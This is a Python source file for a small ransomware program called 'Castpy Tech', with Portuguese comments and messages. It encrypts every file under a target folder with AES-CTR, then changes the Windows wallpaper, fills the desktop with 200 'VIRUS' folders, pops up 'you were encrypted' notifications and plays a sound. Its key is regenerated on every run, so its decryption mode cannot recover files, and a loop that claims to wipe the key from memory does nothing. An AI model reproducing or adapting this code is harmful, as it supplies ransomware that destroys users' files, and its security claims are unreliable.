from Crypto.Cipher import AES
import pygame
from win10toast import ToastNotifier
import ctypes
from Crypto.Util import Counter
import pyfiglet
import Discovery
import argparse
import secrets
import Crypter
import os


#Chave de desencriptação
HARDCODED_KEY = secrets.token_bytes(16)

def getParse():
    parser = argparse.ArgumentParser(description="Castpy Tech")
    parser.add_argument('-d', '--decrypt', help='Decripta os arquivos [Default: no]', action='store_true')
    return parser

def main():
    parser = getParse()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print(f'''
        {pyfiglet.figlet_format("Castpy Tech")}

        Seus arquivos foram criptografados!
        Para decriptá-los utilize a seguinte senha '{HARDCODED_KEY}'
        ''')
        
        key = input('Digite a senha > ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY
    

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFN = crypt.encrypt
    else:
        cryptFN = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'teste'))
    starDirs = [init_path]

    for currentDir in starDirs:
        for filename in Discovery.discoverFile(currentDir):
            Crypter.changeFiles(filename, cryptFN)

    #Limpando a chave de criptografia da memória

    for i in range(100):
        pass

    if not decrypt:
        SPI_SETDESKWALLPAPER = 20
        # Definir o caminho do arquivo de imagem
        image_path = os.path.join(os.getcwd(), 'img', 'wallpaper.jpg')
        # Chamando a função de API do Windows para definir o papel de parede
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)

        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        for i in range(1, 201):
            folder_name = f"VIRUS 🦠 {i}"
            folder_path = os.path.join(desktop_path, folder_name)
            os.makedirs(folder_path)
            toaster = ToastNotifier()
            toaster.show_toast("Castpy Tech", "Você foi criptografado", duration=0.2)





if __name__ == '__main__':
    pygame.mixer.init()
    sound = pygame.mixer.Sound('audio/som.mp3')
    sound.play()
    main()